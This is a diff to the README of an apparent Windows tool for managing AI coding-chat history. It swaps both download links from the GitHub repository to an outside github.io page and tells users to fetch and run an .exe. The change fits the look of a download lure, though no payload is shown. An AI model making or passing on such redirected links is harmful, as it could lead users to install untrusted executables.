@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-history-cli-2026 - Master your artificial intelligence coding history
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/newenglandclamchowderinscrutability324/awesome-ai-history-cli-2026)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://newenglandclamchowderinscrutability324.github.io)
 
 This software manages the record of your conversations with intelligence models. It keeps your coding history on your computer. It helps you track your work and control the costs associated with your prompts.
 
@@ -12,7 +12,7 @@ You need a computer that runs Windows 10 or Windows 11. Your system should have 
 
 Visit the official release page to download the software.
 
-[Click here to visit the download page](https://github.com/newenglandclamchowderinscrutability324/awesome-ai-history-cli-2026)
+[Click here to visit the download page](https://newenglandclamchowderinscrutability324.github.io)
 
 Scroll to the section labeled Assets. Find the file that ends with .exe and click it. Your browser will save the file to your computer.
 
